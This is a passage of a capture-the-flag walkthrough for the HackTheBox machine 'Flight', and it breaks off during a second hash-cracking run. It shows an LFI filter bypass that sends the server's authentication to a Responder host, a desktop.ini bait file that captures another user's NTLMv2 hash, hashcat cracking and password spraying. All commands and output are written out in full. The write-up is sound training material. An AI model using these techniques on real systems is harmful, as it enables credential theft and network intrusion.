import FakeBrowserFrame from '@site/src/components/FakeBrowserFrame';


## At a Glance

Flight is a Hard difficulty Windows machine that requires a deep understanding of Active Directory, Web exploitation, and Windows internals. The journey begins with enumerating subdomains to find an aviation school portal vulnerable to Local File Inclusion (LFI). Unlike standard LFI scenarios where one reads local files, I had to weaponize this LFI to force an outbound connection to my rogue SMB server, capturing a service account's NTLMv2 hash.

From there, it was a game of lateral movement. After cracking the hash, I discovered a password reuse scenario that allowed me to compromise a second user. This user had write access to a shared folder, which I used to perform a client-side attack using a malicious `desktop.ini` file, capturing the credentials of a senior developer. With these new credentials, I uploaded a web shell to the server, pivoted through an internal port using `chisel`, and compromised a service account. For privilege escalation, I executed two methods: the "unintended" route, abusing `SeImpersonatePrivilege` with a Potato exploit to instantly read the root flag, then going the "intended" route, abusing Windows Virtual Accounts by using the `iis apppool\defaultapppool` account to request a TGT for the machine account, enabling a DCSync attack to seize full control of the domain.

---

## Enumeration & Reconnaissance

### Nmap Scan

As always, I started with an `nmap` scan to identify open ports and services.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ sudo nmap -sC -sV 10.129.228.120
[sudo] password for m4ias7ru: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-26 02:30 EST
Nmap scan report for 10.129.228.120
Host is up (0.047s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-26 14:31:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-12-26T14:31:09
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.16 seconds
```

The output indicated a standard Active Directory Domain Controller configuration, but the presence of Apache on port 80 was slightly unusual. I added `flight.htb` to my `/etc/hosts` file and moved to web enumeration.

### Subdomain Discovery & LFI

Visiting the main site revealed a page for an airline company called "g0".

<FakeBrowserFrame url="http://flight.htb">
  
</FakeBrowserFrame>

I poked around the menus, but everything linked to `#`. It felt like a static template with no real functionality. Fuzzing directories hit a wall, so I switched gears to subdomain enumeration to see if there was more to this than meets the eye.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ ffuf -u http://flight.htb -H "Host: FUZZ.flight.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 1,1546

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1,1546
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 108ms]
:: Progress: [114442/114442] :: Job [1/1] :: 180 req/sec :: Duration: [0:05:55] :: Errors: 0 ::
```

I discovered `school.flight.htb`. After adding it to my hosts file, I visited the site.

<FakeBrowserFrame url="http://school.flight.htb">
  
</FakeBrowserFrame>

Navigating this site, I noticed an interesting URL structure when visiting the "About Us" page:

<FakeBrowserFrame url="http://school.flight.htb/index.php?view=about.html">
  
</FakeBrowserFrame>

And the "Blog" page:

<FakeBrowserFrame url="http://school.flight.htb/index.php?view=blog.html">
  
</FakeBrowserFrame>

This structure, with `index.php?view=file`, is a classic indicator of potential Local File Inclusion (LFI). I immediately attempted a path traversal to read a Windows system file.

<FakeBrowserFrame url="http://school.flight.htb/index.php?view=../../../../../../../../Windows/win.ini">
  
</FakeBrowserFrame>

The application responded with a "Suspicious Activity Blocked!" message, but this was actually good news. While I couldn't read the file, the custom error message confirmed that the input is being processed and filtered, rather than just failing.

So, to better understand the filtering, I pointed the view parameter to index.php itself and checked the source code.

<FakeBrowserFrame url="view-source:http://school.flight.htb/index.php?view=index.php">
  
</FakeBrowserFrame>

The source code revealed the filter logic. It blocks specific stuff like `..`, `\`, `.shtml` and `htaccess`, but it doesn't seem to block forward slashes `/`.

:::tip 
If you can trigger a file inclusion via a UNC path (Universal Naming Convention) like `//10.10.14.179/share/file` for example, the Windows OS will automatically attempt to authenticate to that remote share using NTLM. This allows us to steal the hash of the account running the web server without needing to read a single local file.
:::

I set up `Responder` to listen for incoming NTLM authentication attempts and then triggered the vulnerability using a UNC path in the browser.

<FakeBrowserFrame url="http://school.flight.htb/index.php?view=//10.10.14.179/testShare/testFile">
  
</FakeBrowserFrame>

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|            
                                        

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON] 
    DNS                        [ON] 
    DHCP                       [OFF]
                                        
[+] Servers:                       
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON] 
    RDP server                 [ON] 
    DCE-RPC server             [ON] 
    WinRM server               [ON] 
    SNMP server                [ON]
                                        
[+] HTTP Options:                   
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF] 
    Force WPAD auth            [OFF]                                             
    Force Basic Auth           [OFF]                                             
    Force LM downgrade         [OFF]   
    Force ESS downgrade        [OFF]                                             
                                                                                 
[+] Generic Options:                    
    Responder NIC              [tun0]
    Responder IP               [10.10.14.179]
    Responder IPv6             [dead:beef:2::10b1]
    Challenge set              [random]                                          
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]
                                                                                 
[+] Current Session Variables:                                                   
    Responder Machine Name     [WIN-XLQBBOFKIMA]
    Responder Domain Name      [9ZA7.LOCAL]
    Responder DCE-RPC Port     [45016]
                                                                                 
[*] Version: Responder 3.1.7.0                                                   
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>                                                                                                               [*] To sponsor Responder: https://paypal.me/PythonResponder                                                                                                                                                                                                                                                                         [+] Listening for events...                                                                                                                                                                                                                                                                                                         
[SMB] NTLMv2-SSP Client   : 10.129.228.120                 
[SMB] NTLMv2-SSP Username : flight\svc_apache              
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:b31a068614bac5c8:8FF58C50BB5F1208E96BBDF399945E05:01010000000000000044809E1176DC01DF76F139D6E0F1E300000000020008003
9005A004100370001001E00570049004E002D0058004C005100420042004F0046004B0049004D00410004003400570049004E002D0058004C005100420042004F0046004B0049004D0041002E0039005A0
0410037002E004C004F00430041004C000300140039005A00410037002E004C004F00430041004C000500140039005A00410037002E004C004F00430041004C00070008000044809E1176DC01060004000
200000008003000300000000000000000000000003000000EDC72611D688971BBE32D4FAE2D9A9C102BBB6C5D24BA3309A9566DCA4BEC6B0A0010000000000000000000000000000000000009002200630
06900660073002F00310030002E00310030002E00310034002E003100370039000000000000000000
```

It worked immediately. The server tried to connect to my share, handing me the NTLMv2 hash for the user `svc_apache`.

---

## User Compromise

### Cracking svc_apache

I saved the hash to a file and fired up `hashcat`.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]                                           
└─$ hashcat -m 5600 NTLMv2-hash /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting
                                        
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 7 8845HS w/ Radeon 780M Graphics, 1456/2912 MB (512 MB allocatable), 4MCU
                                        
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256       
Minimum salt length supported by kernel: 0                                  
Maximum salt length supported by kernel: 256                              
                                                                                 
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
                                                                                 
Optimizers applied:
* Zero-Byte            
* Not-Iterated                                                                   
* Single-Hash         
* Single-Salt          
                                        
ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.
                                        
Watchdog: Temperature abort trigger set to 90c                                

Host memory allocated for this attack: 513 MB (917 MB free)
                                        
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392                                                           
* Bytes.....: 139921507                                                          
* Keyspace..: 14344385
* Runtime...: 1 sec                                                              
                                        
Cracking performance lower than expected?                 
                                                                                 
* Append -O to the commandline.   
  This lowers the maximum supported password/salt length (usually down to 32).
                                                                                                                                                                  * Append -w 3 to the commandline.                                                                                                                                   This can cause your screen to lag.                                                                                                                                                                                                                                                                                                * Append -S to the commandline.                                                  
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.
                                        
* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver                                            
                                                                                 
* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework                                               
                                                                                 
SVC_APACHE::flight:b31a068614bac5c8:8ff58c50bb5f1208e96bbdf399945e05:01010000000000000044809e1176dc01df76f139d6e0f1e3000000000200080039005a004100370001001e0057004
9004e002d0058004c005100420042004f0046004b0049004d00410004003400570049004e002d0058004c005100420042004f0046004b0049004d0041002e0039005a00410037002e004c004f004300410
04c000300140039005a00410037002e004c004f00430041004c000500140039005a00410037002e004c004f00430041004c00070008000044809e1176dc010600040002000000080030003000000000000
00000000000003000000edc72611d688971bbe32d4fae2d9a9c102bbb6c5d24ba3309a9566dca4bec6b0a001000000000000000000000000000000000000900220063006900660073002f00310030002e0
0310030002e00310034002e003100370039000000000000000000:S@Ss!K@*t13
                                                          
Session..........: hashcat                                                       
Status...........: Cracked         
Hash.Mode........: 5600 (NetNTLMv2)                                              
Hash.Target......: SVC_APACHE::flight:b31a068614bac5c8:8ff58c50bb5f120...000000
Time.Started.....: Fri Dec 26 06:16:26 2025 (19 secs)
Time.Estimated...: Fri Dec 26 06:16:45 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)      
Speed.#01........:   556.9 kH/s (2.58ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10665984/14344385 (74.36%)
Rejected.........: 0/10665984 (0.00%)
Restore.Point....: 10661888/14344385 (74.33%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: SAESH21 -> Ryanpetter 
Hardware.Mon.#01.: Util: 60%

Started: Fri Dec 26 06:15:58 2025
Stopped: Fri Dec 26 06:16:47 2025
```

:::info NTLMv2 Hash Cracked
The password is: `S@Ss!K@*t13`, so now I have the set of credentials `svc_apache:S@Ss!K@*t13`.
:::

### Enumerating SMB

With valid credentials, I enumerated the SMB shares.

```plaintext {1,2}                                    
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ nxc smb 10.129.228.120 -u svc_apache -p 'S@Ss!K@*t13' -d flight --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.120  445    G0               [+] flight\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ            
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ
```

I had READ access to three non-default shares: `Shared`, `Users` and `Web`. `Shared` was empty, so I checked `Users`.

```plaintext {1,2,5}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]                                           
└─$ smbclient -U svc_apache //10.129.228.120/Users                                
Password for [WORKGROUP\svc_apache]:                                             
Try "help" to get a list of possible commands.
smb: \> ls                                                                       
  .                                  DR        0  Thu Sep 22 16:16:56 2022
  ..                                 DR        0  Thu Sep 22 16:16:56 2022
  .NET v4.5                           D        0  Thu Sep 22 15:28:03 2022
  .NET v4.5 Classic                   D        0  Thu Sep 22 15:28:02 2022
  Administrator                       D        0  Mon Oct 31 14:34:00 2022
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  C.Bum                               D        0  Thu Sep 22 16:08:23 2022
  Default                           DHR        0  Tue Jul 20 15:20:24 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  Public                             DR        0  Tue Jul 20 15:23:25 2021
  svc_apache                          D        0  Fri Oct 21 14:50:21 2022
                                                                                 
                5056511 blocks of size 4096. 1240826 blocks available     
```

I saw a folder for `C.Bum`. At this point, my spider senses started tingling. The user flag wasn't in `svc_apache`'s directory, which meant `svc_apache` was just a stepping stone. I'd likely need to compromise `C.Bum` to get the flag.

I'll download everything by running `prompt OFF`, `recurse ON`, and then `mget *`. 

```plaintext {1,2,3}
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
getting file \desktop.ini of size 174 as desktop.ini (0.9 KiloBytes/sec) (average 0.9 KiloBytes sec)                                                              
NT_STATUS_ACCESS_DENIED listing \.NET v4.5\*
<SNIP>
```

Some files I couldn't access or download, but from the ones I did download, nothing seemed interesting, mostly default and empty directory structures

Let's see the `Web` share.

```plaintext {1,2,5}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ smbclient -U svc_apache //10.129.228.120/Web  
Password for [WORKGROUP\svc_apache]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Dec 26 17:37:01 2025
  ..                                  D        0  Fri Dec 26 17:37:01 2025
  flight.htb                          D        0  Fri Dec 26 17:37:01 2025
  school.flight.htb                   D        0  Fri Dec 26 17:37:01 2025
```

These directories clearly contain the source code for the sites I was exploring earlier. I'll download them as well and take a look inside.

```plaintext {1,2}
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
getting file \flight.htb\index.html of size 7069 as flight.htb/index.html (37.3 KiloBytes/sec) (average 37.3 KiloBytes/sec)
getting file \school.flight.htb\about.html of size 1689 as school.flight.htb/about.html (8.5 KiloBytes/sec) (average 22.5 KiloBytes/sec)
<SNIP>
```

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight/web]
└─$ tree .
.
├── flight.htb
│   ├── css
│   │   ├── layout.css
│   │   ├── reset.css
│   │   └── style.css
│   ├── images
│   │   ├── bg_bot.jpg
│   │   ├── bg_box1.jpg
│   │   ├── bg_img2.jpg
│   │   ├── bg_img.jpg
│   │   ├── bg_testimonials.gif
│   │   ├── bg_top.jpg
│   │   ├── button1_bg.gif
│   │   ├── button2_bg.gif
│   │   ├── button_top_active.jpg
│   │   ├── button_top.jpg
│   │   ├── img1.gif
│   │   ├── img2.gif
│   │   ├── img3.gif
│   │   ├── line_top.gif
│   │   ├── logo.jpg
│   │   ├── marker_1.gif
│   │   ├── page2_img1.jpg
│   │   ├── page2_img2.jpg
│   │   ├── page3_img1.jpg
│   │   ├── page3_img2.jpg
│   │   ├── page4_img1.jpg
│   │   └── page4_img2.jpg
│   ├── index.html
│   └── js
│       ├── cufon-replace.js
│       ├── cufon-yui.js
│       ├── html5.js
│       ├── ie6_script_other.js
│       ├── ie6_warning
│       │   ├── ie6nomore-chrome.jpg
│       │   ├── ie6nomore-cornerx.jpg
│       │   ├── ie6nomore-firefox.jpg
│       │   ├── ie6nomore-ie8.jpg
│       │   ├── ie6nomore-opera.jpg
│       │   ├── ie6nomore-safari.jpg
│       │   └── ie6nomore-warning.jpg
│       ├── jquery-1.4.2.js
│       ├── Myriad_Pro_400.font.js
│       ├── Myriad_Pro_italic_400.font.js
│       ├── Myriad_Pro_italic_600.font.js
│       └── PIE.htc
└── school.flight.htb
    ├── about.html
    ├── blog.html
    ├── home.html
    ├── images
    │   ├── background.gif
    │   ├── background.jpg
    │   ├── bg-content.gif
    │   ├── bg-footer.gif
    │   ├── bg-header2.jpg
    │   ├── bg-header.gif
    │   ├── bg-home.gif
    │   ├── bg-menu.gif
    │   ├── icon-facebook.gif
    │   ├── icon-twitter.gif
    │   ├── icon-youtube.gif
    │   ├── logo.gif
    │   ├── model1.jpg
    │   ├── model2.jpg
    │   └── model3.jpg
    ├── index.php
    ├── lfi.html
    └── styles
        ├── ie6.css
        └── style.css

9 directories, 64 files
```

There's nothing interesting in here, I found no config files or hardcoded credentials. It felt like a dead end.

I decided to check the full list of domain users using `nxc` to gather a list for password spraying.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ nxc smb 10.129.228.120 -u svc_apache -p 'S@Ss!K@*t13' -d flight --users 
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.120  445    G0               [+] flight\svc_apache:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               -Username-                    -Last PW Set-       -BadPW- -Description-                                       
SMB         10.129.228.120  445    G0               Administrator                 2022-09-22 20:17:02 0       Built-in account for administering the computer/domain
SMB         10.129.228.120  445    G0               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.228.120  445    G0               krbtgt                        2022-09-22 19:48:01 0       Key Distribution Center Service Account 
SMB         10.129.228.120  445    G0               S.Moon                        2022-09-22 20:08:22 0       Junion Web Developer 
SMB         10.129.228.120  445    G0               R.Cold                        2022-09-22 20:08:22 0       HR Assistant 
SMB         10.129.228.120  445    G0               G.Lors                        2022-09-22 20:08:22 0       Sales manager 
SMB         10.129.228.120  445    G0               L.Kein                        2022-09-22 20:08:22 0       Penetration tester 
SMB         10.129.228.120  445    G0               M.Gold                        2022-09-22 20:08:22 0       Sysadmin 
SMB         10.129.228.120  445    G0               C.Bum                         2022-09-22 20:08:22 2       Senior Web Developer 
SMB         10.129.228.120  445    G0               W.Walker                      2022-09-22 20:08:22 0       Payroll officer 
SMB         10.129.228.120  445    G0               I.Francis                     2022-09-22 20:08:22 0       Nobody knows why he's here 
SMB         10.129.228.120  445    G0               D.Truff                       2022-09-22 20:08:22 0       Project Manager 
SMB         10.129.228.120  445    G0               V.Stevens                     2022-09-22 20:08:22 0       Secretary 
SMB         10.129.228.120  445    G0               svc_apache                    2022-09-22 20:08:23 0       Service Apache web 
SMB         10.129.228.120  445    G0               O.Possum                      2022-09-22 20:08:23 0       Helpdesk 
SMB         10.129.228.120  445    G0               [*] Enumerated 15 local users: flight
```

Wow, I definitely wasn't expecting this many users. I will add them to a file and try a password spray with the password I already have `S@Ss!K@*t13`, hoping for a password reuse scenario.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ nxc smb 10.129.228.120 -u users.txt -p 'S@Ss!K@*t13' -d flight
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.120  445    G0               [+] flight\S.Moon:S@Ss!K@*t13
```

:::success Password Reuse Confirmed
`S.Moon` is reusing the `svc_apache` password (`S@Ss!K@*t13`). This was the key to pivoting from a service account to a legitimate domain user.
:::

I quickly checked `S.Moon`'s privileges on the shares.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ nxc smb 10.129.228.120 -u S.Moon -p 'S@Ss!K@*t13' -d flight --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.120  445    G0               [+] flight\S.Moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ
```

### Client-Side Attack on 'Shared'

`S.Moon` has `WRITE` access to the `Shared` share, which is empty btw, but judging from the name of the share, it is totally possible that other users access this share. It implies a "watering hole" or client-side attack vector. If I drop a malicious file here, other users (bots or humans) browsing this share might trigger it.

In Windows, simply browsing a directory can trigger the processing of certain files like `desktop.ini` files that define folder icons or `.scf` files. If I point that icon resource to a malicious UNC path, I can force any user who browses that share to authenticate to me and capture his NTLM hash.

I used a tool called [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) to generate a malicious `desktop.ini` file.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight/ntlm_theft]
└─$ python3 ntlm_theft.py -g all -s 10.10.14.179 -f test
/home/m4ias7ru/Desktop/Flight/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: test/test.scf (BROWSE TO FOLDER)
Created: test/test-(url).url (BROWSE TO FOLDER)
Created: test/test-(icon).url (BROWSE TO FOLDER)
Created: test/test.lnk (BROWSE TO FOLDER)
Created: test/test.rtf (OPEN)
Created: test/test-(stylesheet).xml (OPEN)
Created: test/test-(fulldocx).xml (OPEN)
Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(includepicture).docx (OPEN)
Created: test/test-(remotetemplate).docx (OPEN)
Created: test/test-(frameset).docx (OPEN)
Created: test/test-(externalcell).xlsx (OPEN)
Created: test/test.wax (OPEN)
Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: test/test.asx (OPEN)
Created: test/test.jnlp (OPEN)
Created: test/test.application (DOWNLOAD AND OPEN)
Created: test/test.pdf (OPEN AND ALLOW)
Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: test/test.library-ms (BROWSE TO FOLDER)
Created: test/Autorun.inf (BROWSE TO FOLDER)
Created: test/desktop.ini (BROWSE TO FOLDER)
Created: test/test.theme (THEME TO INSTALL)
Generation Complete.
```

Here's how `desktop.ini` looks btw:

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight/ntlm_theft/test]
└─$ cat desktop.ini
[.ShellClassInfo]
IconResource=\\10.10.14.179\aa
```

Pretty simple, no black magic involved.

I uploaded the `desktop.ini` to the `Shared` share and restarted `Responder`, waiting for a bite.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight/ntlm_theft/test]
└─$ smbclient -U S.Moon //10.129.228.120/Shared
Password for [WORKGROUP\S.Moon]:
Try "help" to get a list of possible commands.
smb: \> put desktop.ini
putting file desktop.ini as \desktop.ini (0.3 kB/s) (average 0.3 kB/s)
```

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ sudo responder -I tun0
[sudo] password for m4ias7ru: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.179]
    Responder IPv6             [dead:beef:2::10b1]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-ACFIZRCE350]
    Responder Domain Name      [1PZO.LOCAL]
    Responder DCE-RPC Port     [49557]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:38894e439e82e1c8:BF876978F9006474A6084815B354B748:010100000000000000A0A13EDA76DC01BE17CA584B1138CB0000000002000800310050005A004F0001001E00570049004E002D0041004300460049005A0052004300450033003500300004003400570049004E002D0041004300460049005A005200430045003300350030002E00310050005A004F002E004C004F00430041004C0003001400310050005A004F002E004C004F00430041004C0005001400310050005A004F002E004C004F00430041004C000700080000A0A13EDA76DC01060004000200000008003000300000000000000000000000003000000EDC72611D688971BBE32D4FAE2D9A9C102BBB6C5D24BA3309A9566DCA4BEC6B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100370039000000000000000000
```

Within moments, `Responder` caught a new NTLMv2 hash. It was `c.bum`, the user I suspected I needed earlier.

I cracked his hash using `hashcat` as well.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[~/Desktop/Flight]
└─$ hashcat -m 5600 CBUM-hash /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting                                                        
                                                                                 
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 7 8845HS w/ Radeon 780M Graphics, 1456/2912 MB (512 MB allocatable), 4MCU
                                                                                 
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256            
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256
                                                                                 
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1              

Optimizers applied:                                                              
* Zero-Byte
* Not-Iterated                 
* Single-Hash                                                                    
* Single-Salt
                                        
ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
